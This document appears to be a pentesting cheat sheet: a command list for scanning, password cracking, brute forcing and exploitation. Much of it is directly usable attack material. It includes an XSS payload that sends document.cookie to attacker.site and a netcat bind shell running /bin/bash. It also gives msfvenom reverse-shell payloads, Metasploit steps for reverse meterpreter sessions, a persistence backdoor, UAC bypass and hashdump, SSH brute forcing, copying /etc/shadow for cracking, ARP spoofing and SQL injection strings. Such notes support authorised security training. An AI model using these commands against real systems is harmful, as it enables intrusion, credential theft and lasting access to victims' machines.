# PenTestBasics
A basic list of tools and commands for pentesting

Important commands:
  Openvpn Linux: sudo openvpn -–config (vpn file name)
  Remote Desktop Linux: rdesktop <ip address>
  Windows File Search: dir /s /b password.txt
  Windows Python and PowerShell version check
    python --version 
    powershell ls
  To determine OS running on a linux machine: uname -a
    
SimpleHTTPServer
  Navigate to the directory you intend to serve abd run: python -m SimpleHTTPServer 8080

IP Route and MAC addresses
  To find the routing table
    Linux: ip route 
    Windows: route print
    OSX: netstat -r
    
  To find MAC Address
    WIN: ipconfig /all
      Another great tool for windows is TCPView
    MacOS: ifconfig
    Linux: ip addr 
  
  To check ARP Cache:
    WIN: arp -a
    MAC: arp
    Linux: ip neighbour
  
  To add a route on Linux
    ip route add <Network-range> via <router-IP> dev <interface>
    eg.ip route add 10.10.10.0/24 via 10.10.11.1 dev tap0
    
    
Active TCP& UDP Connections
  To check the current listening ports and the current TCP connections on a host
    WIN: netstat –ano 
    Linux: netstat -tunp
    MAC OS: netstat -p tcp -p udp together with lsof -n -i4TCP -i4UDP

Wireshark
  Tap0 is the VPN interface
  Click on a packet and choose follow TCP stream
    Red part is traffic generated from the browser 
    Blue is traffic generated by the server 
  Display Filters: https://wiki.wireshark.org/DisplayFilters
  In promiscuous mode, a network card will accept and process any packet it receives
    
  To use raw mac address, rather than the manufacturer name: View>Name Resolution>Enable MAC layer
  To do a display filter for mac address: eth.dest == macaddress
    
Nmap
  Port scan: nmap -sn 10.10.10.0/24
  Skip ping and scan for OS: nmap -PN -O <targets>
    --osscan-limit: limit os scan to promising targets
      Example: nmap -O -–osscan-limit <targets>
	  --osscan-guess: guess OS more aggressively.
  TCP connect: namp -sT 10.0.0.0  
  TCP SYN(default): nmap -sS 10.0.0.0 
  Servcie Detection: nmap -sV 10.0.0.0
  Port scan: nmap -p <port range>
  To output: nmap -sn 10.0.0.* > hostsup.txt
  
massscan
  masscan -p22,80,443,53,3389,8080,445 -Pn –rate=800 –banners 10.142.111.0/24  -e tap0 –route-ip 10.0.0.1

fPing 
fping -a -g 10.10.10.0/24 2>/dev/null > targets

Web Server FInger Printing 
  To get basic server info such as Hardware and Firmware
    nc target.site 80
    HEAD / HTTP/1.0
    <two empty line and then hit enter>
  You can also use httprint: httprint -P0 -h <target hosts> -s /usr/share/httprint/signatures.txt

HTTP Verbs
  GET: Used to request a resource. When a user wants to open a web page, the browser sends a GET request.
    GET /page.php HTTP/1.1
  POST: Used to submit HTML form data. POST parameters must be in the message body.  
    POST /login.php HTTP/1.1
	  Host: www.example.site
    <two empty lines>
	  Username=john&password=mypass
  HEAD: Asks for just the headers of the response instead of the response body
  PUT: Used to upload a file to the server. As you can imagine, it is a very dangerous feature if it is allowed, and it is misconfigured.
    PUT /path/to/destination HTTP/1.1
    Host: www.example.com
    <two empty lines>
    <PUT Data>
  DELETE: Remove a file from the server; this is another feature that must be configured wisely as a misused DELETE leads to denial of service and data loss.
    DELETE /path/to/destination HTTP/1.1
    Host: www.example.site
  OPTIONS: query the web server for enabled HTTP verbs.
    OPTIONS / HTTP/1.1
    Host: www.example.com 

John
  Bruteforce
    John -incremental -users:<userlist> <file to crack>
    For a specific user: John -incremental -users:victim crackme
Dictionary
  In most UNIX system, the password file is kept in /etc/passwd
  john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5
  unshadow passwd shadow > unshadowed.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
To show all cracked passwords: John --show crackme

dirb
  dirb http://10.10.10.10/
  dirb http://google.com /usr/share/dirb/wordlists/small.txt
  dirb http://10.10.10.10/dir -u username:password
  dirb http://192.168.0.33 -X “.php, .bak”
  dirb http://192.168.0.33 -x extenstionlist.txt 
  To save to a file: dirb http://192.168.0.33 -o results.txt

  I suggest you to use dirbuster for better speed. Keep the threads at 20. Use /usr/share/wordlists/dirb/common.txt wordlist.

Netcat
  Listening for reverse shell (server)
    nc -nvlp 8888
      for udp: -lvup
  Client
    nc -v 172.0.0.1 8888
    
  On the client, you can pass data and outputs to the netcat server
    echo “hello” | nc 127.0.0.1 8888
  
  We can make the server save the received data into a file 
    Server: nc -lvp 8888 > received.txt
    Client: cat tobesent.txt | nc 127.0.0.1 8888
  
  To create a remote shell via a netcat session
    server: nc -lvp 1337 -e /bin/bash
    client: nc -v 127.0.0.1 1337
    
  To create an HTTP TCP connection to ferrari.com  
    nc -v www.ferrari.com 80
    GET / HTTP/1.1
    Host: www.ferrari.com
    <two empty lines and then hit enter>
   
  Banner Grabbing
    nc -nv 10.10.10.10 <port>
    
Passive Domain Enumeration
  DNS Dumpster: www.dnsdumpster.com
  VirusTotal: Search function > Relations > observed subdomains
  Sublist3r: sublist3r -v -d google.com -b
  amass: snap run amass -ip -d google.com (takes a long time)
  
SQLMap
  Check if injection exists manually 
    Test the search bar and adjust the search term by adding ‘ at the end of it. 
      We got an sql error message. This vulnerable 
      Now adjust it by adding or 1=1; -- -
    Try a union-based injection 
      search=notexist’ UNION SELECT ‘els1’; -- - 
      this might fail, but keep adding parameters until it goes through 
      search=notexist’ UNION SELECT ‘els1’,’els2’,’els3’,’els4’; -- - 
    If the union check worked, use this: sqlmap -u ‘sqlmap.test/search.php?search=n’ -p search –technique=u 
        changeto B if the first test worked

  Check if injection exists using sqlmap
    sqlmap -r Post.req
    sqlmap -u "http://10.10.10.10/file.php?id=1" -p id
    sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"

  Get database if injection Exists
    sqlmap -r login.req --dbs
    sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs
    sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs\

  Get Tables in a Database
    sqlmap -r login.req -D dbname --tables
    sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables
    sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables

  Get data in a Database tables
    sqlmap -r login.req -D dbname -T table_name --dump
    sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump
    sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump
    sqlmap -u ‘sqlmap.test/search.php?search=n’ -p search –technique=u -D <DB> -T <table> -C <columns separated by commas> --dump
    
  To grab banner: sqlmap -u sqli.site/view.php?id=1 -b

Hydra

  SSH and Telnet Login Bruteforcing

  Edit minimal.usr and remove the unnecessary line in the start of it: usr/share/ncrack/minimal.usr
  Make sure to update before trying to install seclists 
    Sudo apt update && apt upgrade -y
  To get the password word lists: sudo apt -y install seclists


  Hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-10.txt telnet://192.168.99.22
  hydra -L /usr/share/ncrack/minimal.usr -P /usr/share/seclists/Passwords/rockyou-15.txt 192.168.99.22 ssh
  hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh
  hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh
  You can use same for FTP, just replace ssh with ftp
    For SSH, if you manage to get one credential pair, you can follow these steps to download /etc/passwd and crack it 
      Create a folder called password on your desktop 
      Start a cmd there 
      Use scp to download passwd and shadow via ssh
      For password: sudo scp root@192.168.100.22:/etc/passwd .
      Then enter the password
      For shadow: sudo scp root@192.168.100.22:/etc/shadow .
      Then enter the password
      Then unshadow both: sudo unshadow passwd shadow > crack 
      Run john: john crack


  HTTP POST Form
  hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V

  You will know which wordlists to use when the time comes

XSS

  Once you get on a web application, look for places where you post/submit text that would be stored in their DB and try the follwoing:
    <h1> Hi </h1>
    <script>alert(‘XSS’)</script>
    Print cookies: <script>alert(document.cookie)</script>
    if any of those were successful, submit the following: 
      <script>
          var i = new Image();
          i.src=”http://attacker.site/get.php? cookies= ”+document.cookie;
      </script> 
    Assuming you have the code to receive the cookies, start firebug in your browser and change the cookie
    
NULL Sessions 

  Before using enum4linux 
    Sudo Vim /etc/samba/smb.conf
      Add under global 
        client min protocol = CORE
        client max protocol = SMB3
        client use spnego = no
        client ntlmv2 auth = no 

  Only works against IPC
  Start by running a syn scan on the specific netbios ports 
  Nmap -sS -p 135,139,445 192.168.102.0-255
  
  If you located a machine with the netbios ports open, run the following 
  enum4linux -n 192.168.102.151  
  If you see the 20 flags, it means the file share service is running 
  Password policy it’s running: enum4linux -P 192.168.102.151
  Enumerate the available shares: enum4linux -S 192.168.102.151
  To enumerate a specific share, you can use a wordlist: enum4linux -s /usr/share/enum4linux/share-list.txt 192.168.102.151
  To run all available commands: enum4linux -a 192.168.102.151
  
  Let’s use nmap to check if it’s vulnerable for null sessions 
	nmap -script=smb-enum-shares 192.168.102.151
	  Anonymous access: read to IPC$ means it is vulnerable to null sessions.
	nmap -script=smb-enum-users 192.168.102.151
  Brute force username and password: nmap -script=smb-enum-brute 192.168.102.151
  
Metasploit
  Setup
    Sudo apt update && apt upgrade  -y
    service postgresql start
    msfdb init
    
    run nmap to find service that we can possibly exploit with metasploit
    Once you find an exploitable service, for example freeftpd, follow these steps 
      msfconsole 
        search freeftp and copy the filepath to the exploit you want to use
          use exploit/windows/ftp/freeftpd_pass
          set ftpuser anonymous
          set rhosts 192.168.99.12
          set rport 21
          set payload windows/meterpreter/reverse_tcp
          set exitfunc process
          set lhost 192.168.99.100
          set lport 4444
          exploit
    Once meterpreter successfuly started  
        check your priv
          getuid
        elevate priv
          getsystem
        check again
          getuid
   Install a backdoor
    Exit session: CTRL + Z
      get session ID: seesions -l
      configure backdoor exploit
        use exploit/windows/local/persistence
        set reg_name backdoor
        set exe_name backdoor
        set startup SYSTEM
        set session 1
        set payload windows/meterpreter/reverse_tcp
        set exitfunc process
        set lhost 192.168.99.100
        set lport 5555
        set DisablePayloadHandler false
        exploit
     System needs to be restarted
       sessions -i 1
       shell 
       shutdown /r /f
     Set up a listener to receive the connection 
      use exploit/multi/handler
      set lhost 192.168.99.100
      set lport 5555
      set payload windows/meterpreter/reverse_tcp
      exploit -j
    Look for the new session
      sessions -l (we find its 2 for example) 
      sessions -i 2

This is a great filter bypass cheatsheet
https://owasp.org/www-community/xss-filter-evasion-cheatsheet

msfvenom shells
JSP Java Meterpreter Reverse TCP
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp

WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war

PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

Metasploit Meterpreter autoroute
run autoroute -s 10.10.10.0/24

ARPSpoof
  sudo bash -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
  apt update && apt upgrade -y
  sudo apt install dsniff
  Arpspoof -i eth0 -t destination -r source

Access Share
smbclient //10.10.10.10/share_name

FTP Enumeration
nmap --script=ftp-anon 10.10.10.10 -p21 -v
nmap -A -p21 10.10.10.10 -v

Login to FTP server
ftp 10.10.10.10

Meterpreter
  sysinfo 
  ps
  getuid
  getpid
  getsystem
  ps -U SYSTEM
  pwd
  ls
  cd
  cat file.txt
  Download filename <path on our machine>: download image.png /root/Desktop/

  Put the current session in the background: background 
    Search for the exploit: search UAC
    Use exploit/windows/local/bypassuac
    Set session 1
    Exploit
    Run getsystem
    Verify: getuid
    
      If successful, use Hashdump:
      You need system privileges 
      To run: hashdump 
      
      
    Ps -U system: display processes with system privileges 
    Pick one and copy its PID 
    Migrate <PID>


CHECK UAC/Privileges
run post/windows/gather/win_privs

BYPASS UAC
Background the session first
exploit/windows/local/bypassuac
set session

After PrivEsc
migrate <pid>
hashdump

Windows Command Line
To search for a file starting from current directory
dir /b/s "*.conf*"
dir /b/s "*.txt*"
dir /b/s "*filename*"

Check routing table
route print
netstat -r

Check Users
net users

List drives on the machine
wmic logicaldisk get Caption,Description,providername
